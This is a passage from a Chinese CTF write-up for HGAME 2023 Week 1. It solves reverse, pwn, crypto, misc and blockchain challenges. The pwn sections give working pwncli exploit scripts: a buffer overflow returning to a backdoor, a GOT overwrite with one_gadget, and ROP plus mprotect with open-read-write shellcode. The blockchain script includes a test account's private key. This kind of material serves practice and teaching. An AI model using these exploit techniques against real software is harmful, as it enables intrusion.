class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python3">cmp = [0x9D, 0x82, 0x63, 0x2E, 0x0F, 0x40, 0x4E, 0xC1, 0xB9, 0xBF, 0x39, 0x9B, 0x14, 0x8B, 0x1F, 0x5A, 0xDE,<br>       0x6D, 0x88, 0x61, 0xCF, 0xC6, 0x65, 0x65, 0x64, 0x4F, 0x06, 0x9F, 0xF6, 0x43, 0x6A, 0x23, 0x6B, 0x7D]<br>v5 = 0xC14E400F<br>v3 = 0x2E63829D<br>v4 = 0x79BDE460<br>for i in range(32):<br>    v5 -= (v4 + v3) ^ ((v3 &gt;&gt; 5) + 1164413185) ^ (16 * (v3 + 54880137))<br>    v5 &amp;= 0xffffffff<br>    v3 -= (v4 + v5) ^ (16 * v5 + 305419896) ^ ((v5 &gt;&gt; 5) + 591751049)<br>    v3 &amp;= 0xffffffff<br>    v4 += 1412567261<br>t1=v3<br>t2=v5<br>for i in range(4):<br>    cmp[i] = t1 &amp; 0xff<br>    t1 &gt;&gt;= 8<br>for i in range(4, 8):<br>    cmp[i] = t2 &amp; 0xff<br>    t2 &gt;&gt;= 8<br>v4 = 0x79BDE460<br>v5=0x5A1F8B14<br>v3=0x9B39BFB9<br>for i in range(32):<br>    v5 -= (v4 + v3) ^ ((v3 &gt;&gt; 5) + 1164413185) ^ (16 * (v3 + 54880137))<br>    v5 &amp;= 0xffffffff<br>    v3 -= (v4 + v5) ^ (16 * v5 + 305419896) ^ ((v5 &gt;&gt; 5) + 591751049)<br>    v3 &amp;= 0xffffffff<br>    v4 += 1412567261<br>t1=v3<br>t2=v5<br>for i in range(8,12):<br>    cmp[i] = t1 &amp; 0xff<br>    t1 &gt;&gt;= 8<br>for i in range(12, 16):<br>    cmp[i] = t2 &amp; 0xff<br>    t2 &gt;&gt;= 8<br>v4 = 0x79BDE460<br>v5=0x6565C6CF<br>v3=0x61886DDE<br>for i in range(32):<br>    v5 -= (v4 + v3) ^ ((v3 &gt;&gt; 5) + 1164413185) ^ (16 * (v3 + 54880137))<br>    v5 &amp;= 0xffffffff<br>    v3 -= (v4 + v5) ^ (16 * v5 + 305419896) ^ ((v5 &gt;&gt; 5) + 591751049)<br>    v3 &amp;= 0xffffffff<br>    v4 += 1412567261<br>t1=v3<br>t2=v5<br>for i in range(16,20):<br>    cmp[i] = t1 &amp; 0xff<br>    t1 &gt;&gt;= 8<br>for i in range(20,24):<br>    cmp[i] = t2 &amp; 0xff<br>    t2 &gt;&gt;= 8<br>v4 = 0x79BDE460<br>v5=0x236A43F6<br>v3=0x9F064F64<br>for i in range(32):<br>    v5 -= (v4 + v3) ^ ((v3 &gt;&gt; 5) + 1164413185) ^ (16 * (v3 + 54880137))<br>    v5 &amp;= 0xffffffff<br>    v3 -= (v4 + v5) ^ (16 * v5 + 305419896) ^ ((v5 &gt;&gt; 5) + 591751049)<br>    v3 &amp;= 0xffffffff<br>    v4 += 1412567261<br>t1=v3<br>t2=v5<br>for i in range(24,28):<br>    cmp[i] = t1 &amp; 0xff<br>    t1 &gt;&gt;= 8<br>for i in range(28,32):<br>    cmp[i] = t2 &amp; 0xff<br>    t2 &gt;&gt;= 8<br>for x in cmp:<br>    print(chr(x), end=&quot;&quot;)<br>print(&quot;&quot;)<br></code></pre></td></tr></table></figure><h2 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/28.png"></p><ul><li>相当于把输入每个字符的前四位和后四位写入了比较数据</li></ul><h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><ul><li>动调拿比较数据，每两个组成一个字符</li></ul><h3 id="Exp-4"><a href="#Exp-4" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python3">cmp=[0x00000008, 0x00000006, 0x00000007, 0x00000006, 0x00000001, 0x00000006, 0x0000000D, 0x00000006, 0x00000005, 0x00000006, 0x0000000B, 0x00000007, 0x00000005, 0x00000006, 0x0000000E, 0x00000006, 0x00000003, 0x00000006, 0x0000000F, 0x00000006, 0x00000004, 0x00000006, 0x00000005, 0x00000006, 0x0000000F, 0x00000005, 0x00000009, 0x00000006, 0x00000003, 0x00000007, 0x0000000F, 0x00000005, 0x00000005, 0x00000006, 0x00000001, 0x00000006, 0x00000003, 0x00000007, 0x00000009, 0x00000007, 0x0000000F, 0x00000005, 0x00000006, 0x00000006, 0x0000000F, 0x00000006, 0x00000002, 0x00000007, 0x0000000F, 0x00000005, 0x00000001, 0x00000006, 0x0000000F, 0x00000005, 0x00000002, 0x00000007, 0x00000005, 0x00000006, 0x00000006, 0x00000007, 0x00000005, 0x00000006, 0x00000002, 0x00000007, 0x00000003, 0x00000007, 0x00000005, 0x00000006, 0x0000000F, 0x00000005, 0x00000005, 0x00000006, 0x0000000E, 0x00000006, 0x00000007, 0x00000006, 0x00000009, 0x00000006, 0x0000000E, 0x00000006, 0x00000005, 0x00000006, 0x00000005, 0x00000006, 0x00000002, 0x00000007, 0x0000000D, 0x00000007, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00000000]<br>flag=&quot;&quot;<br>for i in range(0,100,2):<br>    flag+=chr((cmp[i+1]&lt;&lt;4)+cmp[i])<br>print(flag)<br></code></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><ul><li>nc get shell</li><li>直接cat flag</li></ul><h2 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/29.png"></p><ul><li>没开PIE<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/30.png"></li><li>可溢出<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/30.png"></li><li>有后门</li></ul><h3 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h3><ul><li>return到后门即可get shell</li></ul><h3 id="Exp-5"><a href="#Exp-5" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python3<br># Date: 2023-01-05 20:19:51<br># Link: https://github.com/RoderickChan/pwncli<br># Usage:<br>#     Debug : python3 exp.py debug elf-file-path -t -b malloc<br>#     Remote: python3 exp.py remote elf-file-path ip:port<br><br>from pwncli import *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc: ELF = gift.libc<br><br>backdoor=0x0000000000401176<br><br>sl(b&#x27;a&#x27;*0x18+p64(0x00000000004011C9)+p64(backdoor))<br>ia()<br></code></pre></td></tr></table></figure><h2 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h2><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/32.png"></p><ul><li>Partial RELRO<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/33.png"></li><li>没检查下界，可以向seats后任意地址写16字节或者泄露，包括got表地址</li></ul><h3 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h3><ul><li>先将exit的got地址改为vuln函数地址，exit的got偏移为-6</li><li>然后泄露stderr的地址，算出libc基地址</li><li>最后把exit的got地址改为one_gadget get shell</li></ul><h3 id="Exp-6"><a href="#Exp-6" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python3<br># Date: 2023-01-05 23:23:51<br># Link: https://github.com/RoderickChan/pwncli<br># Usage:<br>#     Debug : python3 exp.py debug elf-file-path -t -b malloc<br>#     Remote: python3 exp.py remote elf-file-path ip:port<br><br>from pwncli import *<br>cli_script()<br>set_remote_libc(&#x27;libc-2.31.so&#x27;)<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br>libc=ELF(&quot;libc-2.31.so&quot;)<br>rl()<br>sl(&quot;-6&quot;)<br>sl(p64_ex(0x00000000004011D6))<br>ru(&quot;Here is the seat from 0 to 9, please choose one.&quot;)<br>sl(&quot;-2&quot;)<br>sl(&quot;&quot;)<br>ru(&quot;Your name is &quot;)<br>addr=u64_ex(r(6).ljust(8,b&#x27;\x00&#x27;))<br>base=addr-0x1ED50A<br>print(hex(base))<br>one=base+0xe3b01<br>ru(&quot;Here is the seat from 0 to 9, please choose one.&quot;)<br>sl(&quot;-6&quot;)<br>sl(p64_ex(one))<br>ia()<br></code></pre></td></tr></table></figure><h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/34.png"></p><ul><li>Partial RELRO，没开PIE，没有金丝雀<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/35.png"></li><li>开了沙盒<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/36.png"></li><li>禁了execve<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/37.png"></li><li>可溢出，但数量不多</li></ul><h3 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h3><ul><li>先leak read的地址然后ret到0x4012CF，注意将rbp改为bss段内地址<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/38.png"></li><li>然后修改rsi为bss内地址再ret到0x4012DE，这步可以向rsi的地址内输入足够rop的字符<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/38.png"></li><li>最后先ROP调用mprotect改bss段的权限，然后写入shellcode，再跳到shellcode地址处执行orw</li></ul><h3 id="Exp-7"><a href="#Exp-7" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python3<br># Date: 2023-01-05 20:23:57<br># Link: https://github.com/RoderickChan/pwncli<br># Usage:<br>#     Debug : python3 exp.py debug elf-file-path -t -b malloc<br>#     Remote: python3 exp.py remote elf-file-path ip:port<br><br>from pwncli import *<br>cli_script()<br>set_remote_libc(&#x27;libc-2.31.so&#x27;)<br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br><br>rsi=0x000000000002601f<br>rdi=0x0000000000401393<br>libc=ELF(&quot;./libc-2.31.so&quot;)<br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>read_got=elf.got[&#x27;read&#x27;]<br>csu1=0x000000000040138A<br>rdx=0x0000000000142c92<br>sc=shellcraft.open(&#x27;/flag&#x27;)+shellcraft.read(3,&#x27;rbp&#x27;,0x30)+shellcraft.write(1,&#x27;rbp&#x27;,0x30)<br>s(b&#x27;a&#x27;*0x100+p64_ex(0x0000000000404190)+p64_ex(rdi)+p64_ex(read_got)+p64_ex(puts_plt)+p64_ex(0x00000000004012CF))<br>rl()<br>read_addr=u64_ex(r(6).ljust(8,b&#x27;\x00&#x27;))<br>base=read_addr-libc.sym[&#x27;read&#x27;]<br>mprotect=base+libc.sym[&#x27;mprotect&#x27;]<br>rdx+=base<br>rsi+=base<br>print(hex(base))<br>s(b&#x27;a&#x27;*0x100+p64_ex(0x00000000004041d0)+p64_ex(rsi)+p64_ex(0x00000000004041d0)+p64_ex(0x00000000004012DE))<br>sc=asm(sc)<br>print(&quot;sc len %d&quot;%len(sc))<br>p=p64_ex(0x00000000004041d0)+p64_ex(rdx)+p64_ex(7)+p64_ex(rdi)+p64_ex(0x0000000000404000)+p64_ex(rsi)+p64_ex(0x1000)+p64_ex(mprotect)+p64_ex(0x404218)<br>p+=sc<br>stop()<br><br>s(p)<br>ia()<br></code></pre></td></tr></table></figure><h2 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" title="simple_shellcode"></a>simple_shellcode</h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/39.png"></p><ul><li>保护全开<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/40.png"></li><li>开了沙盒，mmap了一个可rwx段，可向其中输入16字节shellcode<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/41.png"></li><li>禁了execve</li></ul><h3 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h3><ul><li>先写入可以输入更多的shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">xor rdi,rdi<br>push 0x100<br>pop rdx<br>mov esi,0xCAFE0010<br>syscall<br></code></pre></td></tr></table></figure></li><li>然后直接写入shellcode，执行orw</li></ul><h3 id="Exp-8"><a href="#Exp-8" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python3<br># Date: 2023-01-05 21:36:24<br># Link: https://github.com/RoderickChan/pwncli<br># Usage:<br>#     Debug : python3 exp.py debug elf-file-path -t -b malloc<br>#     Remote: python3 exp.py remote elf-file-path ip:port<br><br>from pwncli import *<br>cli_script()<br>set_remote_libc(&#x27;libc-2.31.so&#x27;)<br><br>shellcode=asm(<br>    &#x27;&#x27;&#x27;<br>        xor rdi,rdi<br>        push 0x100<br>        pop rdx<br>        mov esi,0xCAFE0010<br>        syscall<br>    &#x27;&#x27;&#x27;<br>)<br><br>rl()<br>s(shellcode)<br>shellcode=asm(shellcraft.open(&#x27;/flag&#x27;)+shellcraft.read(3,&#x27;rbp&#x27;,0x30)+shellcraft.write(1,&#x27;rbp&#x27;,0x30))<br>s(shellcode)<br>ia()<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><h3 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h3><ul><li>分解n直接解</li></ul><h3 id="Exp-9"><a href="#Exp-9" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python3">import binascii<br>import gmpy2<br>def Decrypt(c,e,p,q):<br>L=(p-1)*(q-1)<br>d=gmpy2.invert(e,L)<br>n=p*q<br>m=gmpy2.powmod(c,d,n)<br>print(binascii.unhexlify(hex(m)[2:]))<br>if __name__ == &#x27;__main__&#x27;:<br>p =  11239134987804993586763559028187245057652550219515201768644770733869088185320740938450178816138394844329723311433549899499795775655921261664087997097294813<br>q =  12022912661420941592569751731802639375088427463430162252113082619617837010913002515450223656942836378041122163833359097910935638423464006252814266959128953<br>e =  65537<br>c =  110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582<br>Decrypt(c,e,p,q)<br>&quot;&quot;&quot;<br>c=110674792674017748243232351185896019660434718342001686906527789876264976328686134101972125493938434992787002915562500475480693297360867681000092725583284616353543422388489208114545007138606543678040798651836027433383282177081034151589935024292017207209056829250152219183518400364871109559825679273502274955582<br>n=135127138348299757374196447062640858416920350098320099993115949719051354213545596643216739555453946196078110834726375475981791223069451364024181952818056802089567064926510294124594174478123216516600368334763849206942942824711531334239106807454086389211139153023662266125937481669520771879355089997671125020789<br>&quot;&quot;&quot;<br></code></pre></td></tr></table></figure><h2 id="Be-Stream"><a href="#Be-Stream" class="headerlink" title="Be Stream"></a>Be Stream</h2><h3 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h3><ul><li>递归改为动态规划，同时限一下数据的大小，直接跑出flag</li></ul><h3 id="Exp-10"><a href="#Exp-10" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python3"><br><br>key = [int.from_bytes(b&quot;Be water&quot;, &#x27;big&#x27;), int.from_bytes(b&quot;my friend&quot;, &#x27;big&#x27;)]<br>def stream(i):<br>    if i==0:<br>        return key[0]<br>    elif i==1:<br>        return key[1]<br>    else:<br>        a=key[0]<br>        b=key[1]<br>        temp=0<br>        for i in range(2,i+1):<br>            temp=a*7+b*4<br>            temp&amp;=0xffffffff<br>            a=b<br>            b=temp<br>        # return (stream(i-2)*7 + stream(i-1)*4)<br>        return temp<br><br>enc=b&#x27;\x1a\x15\x05\t\x17\t\xf5\xa2-\x06\xec\xed\x01-\xc7\xcc2\x1eXA\x1c\x157[\x06\x13/!-\x0b\xd4\x91-\x06\x8b\xd4-\x1e+*\x15-pm\x1f\x17\x1bY&#x27;<br>flag=b&quot;&quot;<br>for i in range(len(enc)):<br>    water = stream((i//2)**6) % 256<br>    flag+=bytes([water^enc[i]])<br>    print(flag)<br></code></pre></td></tr></table></figure><h2 id="神秘的电话"><a href="#神秘的电话" class="headerlink" title="神秘的电话"></a>神秘的电话</h2><ul><li>不会</li></ul><h2 id="兔兔的车票"><a href="#兔兔的车票" class="headerlink" title="兔兔的车票"></a>兔兔的车票</h2><ul><li>不会</li></ul><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs base64">aGdhbWV7V2VsY29tZV9Ub19IR0FNRTIwMjMhfQ==<br></code></pre></td></tr></table></figure><ul><li>给了base64，直接解</li></ul><h2 id="Where-am-I"><a href="#Where-am-I" class="headerlink" title="Where am I"></a>Where am I</h2><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/42.png"></p><ul><li>附件是个流量包</li></ul><h3 id="思路-16"><a href="#思路-16" class="headerlink" title="思路"></a>思路</h3><ul><li>题目描述说拍照上传到了网盘，所以应该有http流量，而且应该可以从中获取照片<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/43.png"></li><li>data段中发现Rar!文件头，应该上传了压缩包</li><li>导出为rar打开，发现里面有图片文件，但是需要密码</li><li>010 editor打开rar文件，发现第24位为0x24，可能是伪加密，改为0x20</li><li>修改后可以成功解压，图片是一片黑，右键查看属性，发现经纬度<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/44.png"></li></ul><h2 id="e99p1ant-want-girlfriend"><a href="#e99p1ant-want-girlfriend" class="headerlink" title="e99p1ant_want_girlfriend"></a>e99p1ant_want_girlfriend</h2><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/45.png"></p><h3 id="思路-17"><a href="#思路-17" class="headerlink" title="思路"></a>思路</h3><ul><li>利用CRC校验改宽高</li></ul><h3 id="Exp-11"><a href="#Exp-11" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python3">import binascii<br>import struct<br><br>#\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xA4\x08\x06\x00\x00\x00<br><br>crc32key = 0xA8586B45<br>def too(c):<br>    return &quot;%02X&quot;%ord(c)<br>for i in range(0, 65535):<br>  height = struct.pack(&#x27;&gt;i&#x27;, i)<br>  #CRC: CBD6DF8A<br>  data = b&#x27;\x49\x48\x44\x52\x00\x00\x02\x00&#x27; + height + b&#x27;\x08\x06\x00\x00\x00&#x27;<br><br>  crc32result = binascii.crc32(data) &amp; 0xffffffff<br><br>  if crc32result == crc32key:<br>    print(height)<br></code></pre></td></tr></table></figure><h2 id="神秘的海报"><a href="#神秘的海报" class="headerlink" title="神秘的海报"></a>神秘的海报</h2><ul><li>不会</li></ul><h1 id="BlockChain"><a href="#BlockChain" class="headerlink" title="BlockChain"></a>BlockChain</h1><h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><ul><li>nc 连交互段可以看合约代码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.17;<br><br>contract Checkin &#123;<br>    string greeting;<br><br>    constructor(string memory _greeting)  &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function greet() public view returns (string memory) &#123;<br>        return greeting;<br>    &#125;<br><br>    function setGreeting(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        string memory expected = &quot;HelloHGAME!&quot;;<br>        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="思路-18"><a href="#思路-18" class="headerlink" title="思路"></a>思路</h3><ul><li>先在交互段创建账号</li><li>然后水龙头拿钱，部署合约</li><li>接着配好RPC发送合约，将greeting设置为HelloHGAME!</li><li>最后用创建账户的token在交互段拿flag</li><li>比赛结束没环境了，就不贴图了</li></ul><h3 id="Exp-12"><a href="#Exp-12" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python3">from web3 import Web3<br><br>my_ipc = Web3.HTTPProvider(<br>    &quot;http://week-1.hgame.lwsec.cn:31254&quot;)<br>assert my_ipc.isConnected()<br>runweb3 = Web3(my_ipc)<br>myaccount = &quot;0x8D625c7825B688342BB6B3d7b66a1FC231D88668&quot;<br>private = &quot;6a37dd0e3f4d2d51059dcb6ccfd368496db5672f55ef39c7da1b2bb42b9813bc&quot;<br>constract = &quot;0xE1cCb6BAD7863F11D17a44A616b221df56D37812&quot;<br>tranfertransaction_dict = &#123;<br>    &#x27;from&#x27;: Web3.toChecksumAddress(myaccount),<br>    &#x27;to&#x27;: constract,<br>    &#x27;gasPrice&#x27;: 10000000000,<br>    &#x27;gas&#x27;: 3000000,<br>    &#x27;nonce&#x27;: None,<br>    &#x27;value&#x27;: 0,<br>    &#x27;chainId&#x27;: 63504,<br>    &#x27;data&#x27;:<br>&quot;0xa41368620000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000b48656c6c6f4847414d4521000000000000000000000000000000000000000000&quot;<br>    &#125;<br>myNonce = runweb3.eth.getTransactionCount(Web3.toChecksumAddress(myaccount))<br>print(myNonce)<br>tranfertransaction_dict[&quot;nonce&quot;] = myNonce<br>r = runweb3.eth.account.signTransaction(tranfertransaction_dict, private)<br>runweb3.eth.sendRawTransaction(r.rawTransaction.hex())<br></code></pre></td></tr></table></figure><ul><li>tranfertransaction_dict 中的 data是在remix里面拿的</li></ul><h1 id="Iot"><a href="#Iot" class="headerlink" title="Iot"></a>Iot</h1><h2 id="Help-marvin"><a href="#Help-marvin" class="headerlink" 